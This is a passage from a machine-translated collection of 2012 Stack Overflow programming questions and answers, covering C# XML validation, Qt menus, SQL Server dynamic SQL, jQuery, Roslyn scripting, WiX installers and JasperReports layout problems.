        // Neues XmlDoc. mit Reader füllen.
        XmlDocument doc = new XmlDocument();            
        doc.Load(reader);

        // Neuer ValidationEventHandler mit settings
        settings.ValidationEventHandler += new ValidationEventHandler(Settings_ValidationEventHandler);

        // Is Valid auf true, wird bei Fehler auf false gesetzt(EventHandler).
        isValid = true;

        // Validierung
        doc.Validate(Settings_ValidationEventHandler);

        // Wenn EventHandler nicht ausgelöst wird bleibt isValid: true.                
        if (isValid == true)
        {
            Console.WriteLine("Valid Document");
        }
        else
        {
            Console.WriteLine("Invalid Document");
        }

        Console.ReadLine();
    }

    /// <summary>
    /// Wird bei Fehler der Validierung ausgelöst, setzt isValid auf false.
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private static void Settings_ValidationEventHandler(object sender, ValidationEventArgs e)
    {

        isValid = false;
        Console.WriteLine("Validation Error: {0}", e.Message);
    }
} 
```

我在这里做错了什么，我的事件没有调用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:07:58.700

You can deplace this code and set `before` `XmlReader.Create`, And Call `reader.Read`

You add also `XmlSchemaValidationFlags`

```
 var settings = new XmlReaderSettings();
    settings.Schemas.Add("http://tempuri.org/OLShopSchnittstelle.xsd", xsdfile);
    settings.ValidationType = ValidationType.Schema;
    settings.ValidationFlags |= XmlSchemaValidationFlags.ProcessInlineSchema;
    settings.ValidationFlags |= XmlSchemaValidationFlags.ReportValidationWarnings;

    settings.ValidationEventHandler += new ValidationEventHandler(Settings_ValidationEventHandler);

    XmlReader reader = XmlReader.Create(xmlfile, settings);

    reader.Read(); 
```

# qt - Qt：具有半透明背景的 QMenu

> ID：12624407
> 
> 赞同：3
> 
> 时间：2012-09-27T15:02:54.630
> 
> 标签：qt, menu, popup, qmenu

我使用 Windows，我想将样式表设置为 QMenu 以使其具有半透明背景。为了使它起作用，我首先设置了 FramelessWindowHint，然后设置了 WA_TranslucentBackground 属性。然后我设置我的样式表并使用弹出方法显示菜单。它绘制正确，但行为奇怪：只要它具有 FramelessWindowHint，它就始终可见（甚至在调用 popup() 方法之前）。单击其中一个条目后，它不再隐藏自己。

这是一个简约的例子：

```
#include <QApplication>
#include <QMenu>
#include <QPoint>
#include <QCursor>

int main(int argc, char *argv[])
{
    QApplication a(argc, argv);
    QMenu menu;
    menu.addAction("about", &a, SLOT(aboutQt()));
    menu.addAction("exit", &a, SLOT(quit()));
    menu.setWindowFlags(Qt::FramelessWindowHint);
    menu.setAttribute(Qt::WA_TranslucentBackground);
    menu.setStyleSheet("QMenu{background:rgba(255, 0, 0, 50%);}");
    menu.popup(QCursor::pos());
    return a.exec();
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T16:01:18.073

```
menu.setWindowFlags(menu.windowFlags() | Qt::FramelessWindowHint); 
```

应该可以解决您的问题。现在您正在清除所有已设置的标志`Qt`。

# bash - 当前会话中打开的文件

> ID：12624414
> 
> 赞同：1
> 
> 时间：2012-09-27T15:03:11.650
> 
> 标签：bash

我需要计算当前会话中活动进程的打开文件。但只有普通文件。我不知道如何将 ps 命令与 lsof 命令“混合”。Lsof 不返回哪些进程属于当前会话。当我使用 ps 列出活动进程时，我不知道如何保存 pid 以使用 lsof 命令查找它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:17:22.370

您可以将逗号分隔的 pid 列表传递给`lsof`使用[命令替换](http://tldp.org/LDP/abs/html/commandsub.html)，如下所示：

```
lsof -p $(ps -o pid= | tr '\n' ',') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T17:28:07.067

将环境变量用于当前进程（及其父进程）的 pid：$$(,$PPID)

```
lsof -R -p $$,$PPID 
```

-R 告诉 lsof 打印 PPID 列

# ember.js - ember.js 从 javascript 切换视图上下文

> ID：12624416
> 
> 赞同：0
> 
> 时间：2012-09-27T15:03:18.697
> 
> 标签：ember.js

对于我们的 ember 代码的速度问题，我试图找到一种在视图上切换上下文的方法。

我们拥有的样本： `{{collection tagName="tbody" contentBinding="App.Controller.allTickets" itemViewClass="App.View.TicketList"}}`

App.View.TicketList 作为模板 Ticket-List App.Controller.allTickets 是一个 ArrayController。

问题是 App.Controller.allTickets 的内容数组中的每个项目都是一个票证对象（模板票证列表显示）。工单对象具有显示在工单列表模板中的计算属性。我们在内容数组中有许多 Ticket 对象（> 1000），只是创建它们，将它们推送到内容数组中，而模板在浏览器中可见则需要很多时间（> 2 分钟）。

我想要做的是创建一个系统，其中 App.Controller.allTickets 中的前 10 个票证对象是“真实”票证对象，而其余的是虚拟对象（像票证对象但只有默认值且没有计算属性的对象）。然后我正在考虑一个函数，它将观察票证列表上的滚动事件，并且当票证（使用票证列表模板显示）滚动到 div 的可见部分时，这是一个虚拟票证，然后更改将 Ticket-List 模板的上下文添加到正确的 Ticket Object，然后重新呈现该视图。

简而言之，如何从 javascript 更改视图/模板的上下文？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T16:51:18.477

我认为您想要做的是在您的控制器上为绑定到内容的可见票证创建一个属性，并在视图上创建一些触发显示其他票证的输入属性。此属性最初只有前十个工单对象，您的视图将显示它而不是完整的工单列表内容。当用户滚动时，将随后的十张票添加到控制器的可见票属性中，视图将更新。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T05:41:08.890

你可能想看看这个...[使用 ember.js 无限滚动（延迟加载）](https://stackoverflow.com/questions/11907093/infinite-scroll-with-ember-js-lazy-loading)
这背后的逻辑可以帮助你构建你正在寻找的东西

# vb.net - EPSON LQ 300+ 在 VB.Net 2005 中进纸不正确

> ID：12624420
> 
> 赞同：0
> 
> 时间：2012-09-27T15:03:30.120
> 
> 标签：vb.net, visual-studio-2005, epson, dot-matrix

在我的帐单中，我使用原始数据在 EPSON LQ300+ 的卷纸上打印。

我在打印机中设置了默认的 3 英寸进纸，以便手动切割票据。

我在账单打印后调用 FF(12) 打印机命令。它工作正常。

但在某些情况下，进纸会增加到 5 英寸。我不知道为什么？

我需要所有比尔的 excat 3 英寸。

# sql - 在 SQL Server 存储过程中使用变量

> ID：12624421
> 
> 赞同：3
> 
> 时间：2012-09-27T15:03:38.017
> 
> 标签：sql, variables, stored-procedures

我在数据库中创建了一个存储过程，`master`因为我希望能够在各种数据库上运行。

我为此创建了一个变量，`database`因此当我执行存储过程时，它将在我想要的那个上运行。我不断收到此语法错误：

> 消息 102，级别 15，状态 1，过程 Stuck_Docs_WF_Rpt，第 12 行
> '.' 附近的语法不正确。

这是我的代码：

```
ALTER PROCEDURE [dbo].[Stuck_Docs_WF_Rpt] 
   @Database char(25)
AS
BEGIN
   select 
      count(@Database.hsi.itemdata.itemnum) as 'Doc(s) Stuck',
      @Database.hsi.lcstate.statename as 'Queue', 
      @Database.hsi.lifecycle.lifecyclename as 'Lifecycle'
   from 
      @Database.hsi.itemdata
   join 
      @Database.hsi.itemlc on @Database.hsi.itemdata.itemnum = @Database.hsi.itemlc.itemnum
   join 
      @Database.hsi.lcstate on @Database.hsi.itemlc.statenum = 
@Database.hsi.lcstate.statenum
   join 
      @Database.hsi.lifecycle on @Database.hsi.itemlc.lcnum = @Database.hsi.lifecycle.lcnum
   where
       @Database.hsi.itemdata.itemnum = @Database.hsi.itemlc.itemnum 
       and @Database.hsi.lcstate.statenum = @Database.hsi.itemlc.statenum
       and @Database.hsi.lcstate.statename Like '%Route' or @Database.hsi.lcstate.statename like '%Initial'
       and @Database.hsi.itemlc.status = '0'
       and DateDiff([Day], @Database.hsi.itemlc.transdate, getDate()) >=1
    group by @Database.hsi.lifecycle.lifecyclename, @Database.hsi.lcstate.statename
END 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:48:02.393

您已经在走向 Dynamic Sql。我使用了相同的过程并使其动态化。

此外，如果您使用的数据库名称少于 25 个字符，我将 @Database 变量替换为 varchar 而不是 char。

```
alter PROCEDURE [dbo].[Stuck_Docs_WF_Rpt] 
   @Database varchar(25)
AS
DECLARE @sql varchar(max)

   SELECT @sql = 'select 
      count('+@Database+'.hsi.itemdata.itemnum) as ''Doc(s) Stuck'',
      '+@Database+'.hsi.lcstate.statename as ''Queue'', 
      '+@Database+'.hsi.lifecycle.lifecyclename as ''Lifecycle''
   from 
      '+@Database+'.hsi.itemdata
   join 
      '+@Database+'.hsi.itemlc on '+@Database+'.hsi.itemdata.itemnum = '+@Database+'.hsi.itemlc.itemnum
   join 
      '+@Database+'.hsi.lcstate on '+@Database+'.hsi.itemlc.statenum = 
'+@Database+'.hsi.lcstate.statenum
   join 
      '+@Database+'.hsi.lifecycle on '+@Database+'.hsi.itemlc.lcnum = '+@Database+'.hsi.lifecycle.lcnum
   where
       '+@Database+'.hsi.itemdata.itemnum = '+@Database+'.hsi.itemlc.itemnum 
       and '+@Database+'.hsi.lcstate.statenum = '+@Database+'.hsi.itemlc.statenum
       and '+@Database+'.hsi.lcstate.statename Like ''%Route'' or '+@Database+'.hsi.lcstate.statename like ''%Initial''
       and '+@Database+'.hsi.itemlc.status = ''0''
       and DateDiff([Day], '+@Database+'.hsi.itemlc.transdate, getDate()) >=1
    group by '+@Database+'.hsi.lifecycle.lifecyclename, '+@Database+'.hsi.lcstate.statename'

    print(@sql)
    --exec(@sql) 
```

# jquery - 通过 JQuery 的 Web 服务 POST 不起作用

> ID：12624422
> 
> 赞同：0
> 
> 时间：2012-09-27T15:03:41.937
> 
> 标签：jquery

我有一个安静的网络服务，我试图通过我的网页通过 jquery 调用发出 HTTP POST 请求。

```
<html>
<head>
<script type="text/javascript" src="js/newjavascript.js"></script>
<link href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/themes/base/jqueryui.css" rel="stylesheet" type="text/css"/>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.5/jquery.min.js"></script>
<script src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/jquery-ui.min.js">       </script>
<script type="text/javascript" src="js/jquery-ui-1.8.22.custom.min.js"> </script>
<script type="text/javascript" src="js/jquery-1.7.2.min.js"> </script>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
</head>
<body>

<input type="text" name="name" value="" id="name"/>
<input type="submit" value="submit" onclick="intialize()"/>
<script>
function formToJSON() {
  return JSON.stringify({"name": $('#name').val() });
 }
  </script>

  <script>
   function intialize(){
   $.ajax({
   type: 'POST',
   contentType: 'application/json',
   url: "http://localhost:41191/test/resources/storeincompleteform",
   dataType: "json",
   data: formToJSON(),
   success: function(data, textStatus, jqXHR){
        alert(' success');

    },
    error: function(jqXHR, textStatus, errorThrown){
        alert('error: ' + textStatus);
    }
  });

      }
  </script>
  </body>
  </html> 
```

但是上面的代码不工作。网络服务工作正常

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:16:22.830

您的脚本正在发布到不同的端口。这与浏览器的[Same Origin Policy](https://en.wikipedia.org/wiki/XMLHttpRequest#Cross-domain_requests)冲突。

如果您尝试从服务器**检索**数据，您可以使用[jQuery 的](http://www.haykranen.nl/2011/02/25/jquery-1-5-and-jsonp-requests/) [内置](http://www.ibm.com/developerworks/library/wa-aj-jsonp1/) [JSONP](http://www.jquery4u.com/json/jsonp-examples/)技术结合一些[服务器端脚本](https://stackoverflow.com/questions/6809053/simple-jquery-php-and-jsonp-example)来规避这一点。

但是，由于在您的情况下您正在尝试将数据**发布**到服务器，因此您有两种选择：

1.  确保*XMLHttpRequest*是同源的
2.  利用现代浏览器中可用[的跨域 XMLHttpRequest技术；](https://developer.mozilla.org/en-US/docs/HTTP_access_control)在这种情况下，您必须配置您的服务器以提供`Access-Control-Allow-Origin`允许您发布的站点的标题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:19:14.417

这是一个 XSS 问题，可能是由于不同的端口。改变：

```
dataType: "json" 
```

至：

```
dataType: "jsonp" 
```

# c# - 如何从 Roslyn 脚本引擎限制对程序集中成员的访问？

> ID：12624424
> 
> 赞同：3
> 
> 时间：2012-09-27T15:03:45.613
> 
> 标签：c#, .net, visual-studio-2012, roslyn, scriptengine

我正在试验 Roslyn 脚本引擎。使用以下代码，我设置了我的脚本引擎。

```
var csharpEngine = new ScriptEngine();

csharpEngine.AddReference("System");

csharpEngine.AddReference(this.GetType().Assembly.Location);            

scriptSession = csharpEngine.CreateSession(); 
```

然后我使用以下行执行脚本：

```
scriptSession.Execute(script); 
```

该脚本包含对我程序集中类的静态函数的非常简单的引用。

```
private string script = 
@"using System;
using RoslynWindow;

Hello.SayHello();"; 
```

在输出窗口中，该函数仅打印到控制台。所以我展示了我可以调用我的程序集的公共静态成员，而无需将“HostObjectModel”传递给脚本引擎。我想*防止*这种情况发生。我希望能够仅注册脚本引擎可以访问的特定成员（函数、变量或属性），而不能注册其他成员。

知道如何做到这一点吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:46:23.393

使用 Roslyn 遍历 AST 以检查脚本是否尝试调用您不允许的任何内容。

# jquery - 回发后如何在jQuery UI范围滑块中操作ui.handle？

> ID：12624425
> 
> 赞同：4
> 
> 时间：2012-09-27T15:03:46.533
> 
> 标签：jquery, jquery-ui, user-interface, slider, handle

我有一个带有**自定义步骤的 jquery****范围滑块**，它有两个句柄（最小和最大），在我的 .aspx 页面中选择一个封闭区域来过滤结果。一旦我点击确认按钮，页面回发并显示我的理想结果。

 **但是我**第一次**想移动右边的手柄时，左边的手柄会移动。当我记录当前句柄时，它始终是左侧显示的句柄。我不明白为什么。

这是我的代码的一部分：

```
var stepvalues = ["0", "3000", "5000"];
$("#slider-range").slider({
     range: true,
     min: 0, 
     max: 2,
     step: 1, 
     values: [0, 5000],
     slide: function (event, ui) {
     console.log($(ui));            
     console.log($(ui.handle));
     }
}); 
```

你有什么线索吗？

非常感谢你。

**编辑**：

我想要做的是最小/最大范围是从 0 到 5000，当我移动滑块时有 3 个可能的值。它只能是 0 或 3000 或 5000。

现在我可以移动滑块以显示相对值，并且在我提交表单进行搜索时它可以工作。但是一旦它进行回发，当我第一次移动右边的滑块时，左边的滑块就会移动。这对我来说是一个奇怪的行为。我希望它正常工作。

当我登录“ui”时，它有几个属性：

```
Object { handle=a.ui-slider-handle, value=3, values=[2]} 
```

“ui.handle”的值始终是我滑块中的第一个句柄；
“ui.value”的值总是第一个句柄的值；
而“ui.values”包含两个句柄的值。

**编辑**：

我发现很难操纵 $(ui.handle)，我使用以下代码来解决我的问题。

```
$("#slider-range").slider('option', 'values', [min, max]); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T09:21:20.413

由于我自己解决了这个问题，所以我将工作代码放在这里并将其标记为已解决！

```
$("#slider-range").slider('option', 'values', [min, max]); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-01T12:55:24.310

如果您不知道自己的 ID：

```
$(ui.handle).parent().slider('option', 'values', [min, max]); 
```**

# javascript - jquery动态添加的.data（）在选择时未定义

> ID：12624428
> 
> 赞同：1
> 
> 时间：2012-09-27T15:03:53.007
> 
> 标签：javascript, jquery

我有以下代码，我在 li 元素上设置一些任意数据

```
function showCountries( data )
{
    for( var i in data )
    {
        var li = document.createElement('li');
        $(li).html( '<a>' + i + '</a><span>&gt;</span>' );
        $(li).data('cargo', { state: data[i] });
        /* 
           right here, if I look at $(li).data('cargo').state in the debugger
           I see the data as expected
        */
        $('#countries').append( li );
        $(li).on('click', $.proxy( countrySelected, li ) );
    }
} 
```

后来，在选择的国家，我想得到货物数据。但是，它是未定义的

```
function countrySelected()
{
    var country = $(this).children('a').html();
    // country is what I expect

    var cargo = $(this).children('a').data('cargo');
    // cargo is undefined here

    // I tried this too:
    var cargo = $('#countries li.selected a').data('cargo');
    // cargo is undefined here as well
} 
```

我做错了什么？这是在页面加载后动态设置 .data() 的问题吗？

谢谢，斯科特

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-27T15:06:01.977

这一行：

```
var cargo = $(this).children('a').data('cargo'); 
```

应该改成这样：

```
var cargo = $(this).data('cargo'); 
```

您在`li`元素中设置数据，而不是在 child 中`a`。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-27T15:05:54.207

您将数据设置在`li`元素上，而不是`a`元素上。

```
var cargo = $(this).data('cargo'); 
```

# javascript - 当我尝试生成基本数学运算时函数返回 NaN

> ID：12624429
> 
> 赞同：1
> 
> 时间：2012-09-27T15:03:55.423
> 
> 标签：javascript

我正在尝试随机生成基本数学运算（加法、减法、乘法和除法），有时我的函数返回 NaN。我使用了函数 parseInt()，但我仍然遇到同样的问题。如果有人可以帮助我提出任何建议，我将不胜感激。先感谢您！

```
Here is my code:

function randNum(min,max)
{
    var num = min+Math.floor((Math.random()*(max-min+1)));
    return num;
}

var choose, operator, firstNum, secondNum,rightAnswer;
function getProb()
{
    var chooseOp=randNum(1,4);
    choose=parseInt(chooseOp);

if (choose==1)
{
    oprator="+";
    var choose1=randNum(0,10);
    var choose2=randNum(0,10);
    firstNum=parseInt(choose1);
    secondNum=parseInt(choose2);
    document.getElementById("mathProb").innerHTML=firstNum+operator+secondNum+"=";
    rightAnswer=choose1 + choose2;
}
else if (choose==2)
{
    operator="-";
    var choose1=randNum(0,10);
    var choose2=randNum(0,10);
    firstNum=parseInt(choose1);
    secondNum=parseInt(choose2);
    document.getElementById("mathProb").innerHTML=firstNum+operator+secondNum+"=";
    rightAnswer=firstNum - secondNum;
}
else if (choose==3)
{
    operator="x";
    var choose1=randNum(0,10);
    var choose2=randNum(0,10);
    firstNum=parseInt(choose1);
    secondNum=parseInt(choose2);
    document.getElementById("mathProb").innerHTML=firstNum+operator+secondNum+"=";
    rightAnswer=choose1 * choose2;
}
    else if (choose==4)
{
    operator="/";
    var choose1=randNum(0,10);
    var choose2=randNum(0,10);
    firstNum=parseInt(choose1);
    secondNum=parseInt(choose2);
    document.getElementById("mathProb").innerHTML=firstNum+operator+secondNum+"=";
    rightAnswer=choose1/choose2;
}
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-27T15:19:54.077

当`choose==1`,`operator`拼写错误为`oprator`. 如果你更正它，问题就解决了 [http://jsfiddle.net/uERwd/2/](http://jsfiddle.net/uERwd/2/)

**更新：** 您的代码可以缩短为：http: [//jsfiddle.net/uERwd/3/](http://jsfiddle.net/uERwd/3/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-27T15:13:53.707

您的除法运算有可能被零除，这将返回 NaN。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-27T15:14:22.167

您的“NaN”错误在这里：

```
rightAnswer=choose1/choose2; 
```

`choose1`an`choose2`是 中的整数`[0, 1]`。

一次超过 121，您将 0 除以 0，得到`NaN`.

不到 11 倍，你将一个非空数除以 0，得到`Infinity`.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-27T15:15:34.500

这是一个简单的语法错误：

```
oprator="+"; // should be `operator` 
```

这就是为什么这个声明...

`firstNum+operator+secondNum+"=";`

...实际上将被评估为...

`firstNum+undefined+secondNum+"=";`

第一对将给你`NaN`，`NaN`+ Number 将`NaN`再次成为 a，`NaN`+ String ( `"="`) 将导致`NaN`转换为字符串，然后附加 '='（因此产生 'NaN='）。

我强烈建议将`"use strict";`line 放在脚本的开头以捕获此类错误。有了这个，你会得到一个错误：

`ReferenceError: assignment to undeclared variable oprator`

...并且不需要让 SO 解析您的脚本以查找错误。)

旁注，我有很多：

*   您的`randNum`函数将返回一个数字，因此无需在其结果上使用`parseInt`（您可能必须转换此函数的*参数*，但即使在这里似乎也没有必要）；

*   如果你除以零，你会得到`Infinity`；如果你将零除以零，你会得到`NaN`结果；做好准备或调整最小值。)

*   你违反了[DRY 原则](http://en.wikipedia.org/wiki/Don%27t_repeat_yourself)，重复了大部分输出结果的语句，为什么不将它们转换为函数呢？检查[这个](http://jsfiddle.net/uERwd/4/)片段（由@sv_in 开始，由我完成）例如如何做。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-27T15:16:10.207

当您随机选择除法运算符时，可能会同时出现`choose1`和`choose1`，这意味着您尝试评估`rightAnswer = 0 / 0;`。在 Javascript 中，这等于`NaN`. 此外，这种情况应该更频繁地发生，如果您在分母中选择零，分子中的任何其他数字都会得到答案`Infinity`。当然，任何东西上的零都是零。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-09-27T15:10:23.807

您需要指定一个代表数字系统的数字，通常以 10 为底

[http://www.w3schools.com/jsref/jsref_parseint.asp](http://www.w3schools.com/jsref/jsref_parseint.asp)

像这样将数字 10 添加到函数调用中

```
firstNum = parseInt(choose1, 10); 
```

# python - 字典的intersection_update？

> ID：12624432
> 
> 赞同：6
> 
> 时间：2012-09-27T15:03:58.127
> 
> 标签：python, dictionary, intersection

我想要一个实现`intersection_update`方法的字典类，在精神上类似于`dict.update`但将更新仅限于调用实例中已经存在的那些键（参见下面的一些示例实现）。

但是，本着 Wheel Reinvention Avoidance 的精神，在我开始实施（并编写测试等）具有此附加功能的映射类之前，类似的东西是否已经存在于或多或少的标准模块中？

* * *

要清楚，`intersection_update`我想到的方法会做这样的事情：

```
def intersection_update(self, other):
    for k in self.viewkeys() & other.viewkeys():
        self[k] = other[k] 
```

...虽然实际的实现可能会尝试一些可能的优化，例如：

```
def intersection_update(self, other):
    x, y = (self, other) if len(self) < len(other) else (other, self)
    for k in x.iterkeys():
        if k in y:
            self[k] = other[k] 
```

编辑：在这篇文章的原始版本中，我写过“或者，是否有一个标准的 Python 习语可以避免实现 [class with a `intersection_update`] 方法的需要？”，但我几乎立即删除了它，因为经过进一步思考，我意识到这是对弱答案的邀请，因为我对 Python 语言的“核心”有足够的了解，可以非常确定不存在这样的习语，至少不存在与优势相匹配的习语（通用性、易读性、易于打字）的专用方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:14:45.247

这是一个伪代码，您可以将其与现有的更新函数一起使用，但是如果您想扩展字典，那么您的代码段也是有效的 - 但这会增加在任何地方使用您的 dict 类的额外麻烦。

```
In [1]: x = dict(name='abc', age=23)

In [2]: y = dict(name='xyz', notes='Note 123', section=None)

In [3]: #x.update(dict((k,y[k]) for k in y if k in x))

In [3]: x.update((k,v) for k,v in y.iteritems() if k in x)

In [4]: x
Out[4]: {'age': 23, 'name': 'xyz'} 
```

编辑：使用 iteritems 方法根据 kjo 的评论更新代码

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T15:21:22.733

试试这个：

```
def dict_intersection(d1, d2):
    return dict((key, d2[key] or d1[key]) for key in frozenset(d1) & frozenset(d2)) 
```

或者，对于 python 版本 >= 2.7：

```
def dict_intersection(d1, d2):
    return {key: d2[key] or d1[key] for key in d1.viewkeys() & d2.viewkeys()} 
```

# c# - WiX 安装程序不适用于 vs 2012

> ID：12624436
> 
> 赞同：3
> 
> 时间：2012-09-27T15:04:10.957
> 
> 标签：c#, wix, windows-installer

我想为我的应用程序创建一个安装程序。我已经下载了 WiX 3.6 并将其安装在 vs 2012 上。

1.  创建简单的winform应用程序
2.  将 WiX 设置项目添加到我的解决方案
3.  右键单击参考并将我的 winform 应用程序添加到设置的参考
4.  我构建解决方案并转到安装项目中的调试目录并运行 SetupProject1.exe.msi 它不起作用并关闭安装程序对话框而没有任何错误。

返回设置项目

1.  右键单击设置项目并选择属性
2.  在安装程序选项卡 > 输出类型上，将其更改为 executablefile.exe
3.  构建它并去调试并运行 SetupProject1.exe - 仍然不起作用

怎么了？这是我的设置项目 product.wxs

```
<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" Name="SetupProject1" Language="1033" Version="1.0.0.0" Manufacturer="Natiloos" UpgradeCode="cfc2f4dd-2da5-49e2-9099-96968d75aaa4">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" />

    <MajorUpgrade DowngradeErrorMessage="A newer version of [ProductName] is  already installed." />
    <MediaTemplate />

    <Feature Id="ProductFeature" Title="SetupProject1" Level="1">
        <ComponentGroupRef Id="ProductComponents" />
    </Feature>
</Product>

<Fragment>
    <Directory Id="TARGETDIR" Name="SourceDir">
        <Directory Id="ProgramFilesFolder">
            <Directory Id="INSTALLFOLDER" Name="SetupProject1" />
        </Directory>
    </Directory>
</Fragment>

<Fragment>
    <ComponentGroup Id="ProductComponents" Directory="INSTALLFOLDER">
        <!-- TODO: Remove the comments around this Component element and     the ComponentRef below in order to add resources to this installer. -->
        <!-- <Component Id="ProductComponent"> -->

        <!-- </Component> -->
    </ComponentGroup>
</Fragment> 
```

如何让安装程序正确构建？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-27T18:18:43.807

问题是您的安装程序没有安装任何东西。添加您的项目作为对安装程序的引用并不意味着安装程序将包含您的项目输出。在您的设置项目中，您有：

```
<Fragment>
  <ComponentGroup Id="ProductComponents" Directory="INSTALLFOLDER">
    <!-- TODO: Remove the comments around this Component element and     the ComponentRef below in order to add resources to this installer. -->
    <!-- <Component Id="ProductComponent"> -->

    <!-- </Component> -->
  </ComponentGroup>
</Fragment> 
```

您需要添加文件...即取消注释`<Component></Component>`标签并手动添加文件。最好`<Component>`每个文件有一个标签。

例子：

```
 <Component Id="MyProgram.exe" Guid="PUT-GUID-HERE">
      <File Id="MyProgram.exe" KeyPath="yes" Source="Path_To_Output_Folder\MyProgram.exe" />
 </Component> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:13:47.593

您描述的类型的 WiX 项目会生成 MSI 文件，扩展名为 .msi。这些安装程序不直接运行，而是使用`msiexec.exe`. 默认情况下，当您双击它们时，Windows 资源管理器会为您执行此操作，但是您可以`msiexec`使用如下命令显式调用

```
msiexec MyInstaller.msi 
```

请注意，MSI 文件与可执行文件完全不同 - 将安装程序的输出名称更改为具有 .exe 扩展名，或将文件重命名为具有 .exe 扩展名将不起作用。

如果您想生成基于 .exe 的安装程序，那么您需要一个引导程序。WiX 有一个叫做 Burn，但是如果我是你，我会担心首先制作一个可以工作的 MSI，*然后再*担心创建一个可执行的引导程序。

# jasper-reports - 具有水平打印顺序的报告：在 textField 中截断长文本的问题

> ID：12624442
> 
> 赞同：1
> 
> 时间：2012-09-27T15:04:54.520
> 
> 标签：jasper-reports, report, export-to-pdf

我正在使用*JasperReports 4.0.2*（从长远来看并没有与它绑定，但现在我们是）。

我在设置支持 3 列数据的子报告时遇到问题。我有 2 个正在打印的文本字段，当文本字段的数据太长时，它被截断。遵循[JasperReport 中的建议 - 换行以在文本字段帖子中显示长文本](https://stackoverflow.com/questions/10631806/jasperreport-wrap-text-to-show-long-text-in-textfield)后，我仍在努力让文本字段正确溢出以显示数据。

这是我的报告文件：

```
<?xml version="1.0" encoding="UTF-8"?>
<jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="record" language="groovy" columnCount="3" printOrder="Horizontal" pageWidth="572" pageHeight="752" columnWidth="157" columnSpacing="50" leftMargin="0" rightMargin="0" topMargin="0" bottomMargin="0">
    <field name="geoName" class="java.lang.String"/>
    <field name="count" class="java.lang.Integer"/>
    <variable name="count" class="java.lang.String">
        <variableExpression><![CDATA[new java.text.DecimalFormat("###,###,###,###").format($F{count})]]></variableExpression>
    </variable>
    <background>
        <band splitType="Stretch"/>
    </background>
    <detail>
        <band height="15" splitType="Stretch">
            <textField isStretchWithOverflow="true">
                <reportElement x="0" y="0" width="90" height="15" stretchType="RelativeToBandHeight" positionType="Float"/>
                <textElement verticalAlignment="Middle">
                    <font fontName="Arial"/>
                </textElement>
                <textFieldExpression><![CDATA[$F{geoName}]]></textFieldExpression>
            </textField>
            <textField isStretchWithOverflow="true">
                <reportElement x="90" y="0" width="67" height="15" stretchType="RelativeToBandHeight" positionType="Float"/>
                <textElement textAlignment="Right" verticalAlignment="Middle">
                    <font fontName="Arial"/>
                </textElement>
                <textFieldExpression><![CDATA[$V{count}]]></textFieldExpression>
             </textField>
             <line>
                <reportElement x="182" y="0" width="1" height="15" forecolor="#CCCCCC" stretchType="RelativeToBandHeight" positionType="Float"/>
            </line>
        </band>
    </detail>
</jasperReport> 
```

报告通常可以正常工作并按应有的水平扩展，但如果任一文本字段中的数据太长，它只会截断它。我唯一的解决方法是增加乐队的大小，但这看起来不太好。我也尝试过***`isPrintWhenDetailOverflows="true"`***国旗。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T17:41:48.567

我找到了我的答案，这只是碧玉的限制。

[http://jasperreports.sourceforge.net/sample.reference/horizo​​ntal/index.html](http://jasperreports.sourceforge.net/sample.reference/horizontal/index.html)

> 水平填充报表模板时，详细信息部分内的动态文本字段不会延伸到其整个文本内容，因为这可能会导致后续详细信息部分的水平轴未对齐。细节带实际上与页脚和列脚的行为相同，在使用水平填充时保留其声明的高度。

长话短说，当水平填充时，你不能指望垂直扩展，真可惜！

# asp.net - C# 中的 OnClientClick 错误？

> ID：12624445
> 
> 赞同：0
> 
> 时间：2012-09-27T15:05:01.667
> 
> 标签：asp.net, gridview, hyperlink, webforms

我希望在删除记录之前向用户填充一个弹出窗口我尝试过**OnClientClick**和**类**以使用 JavaScript/jQuery 处理它但没有成功

**错误**

```
Type 'System.Web.UI.WebControls.HyperLinkField' does not have a public property named 'OnClientClick'. 
```

**控制**

```
 <asp:HyperLinkField  OnClientClick="return confirm('Are you sure you would like to delete the selected landing page?')" datanavigateurlfields="id"    datanavigateurlformatstring="ViewLandingPages.aspx?id={0}&delete=yes"   HeaderText="Delete"  Text="Delete" /> 
```

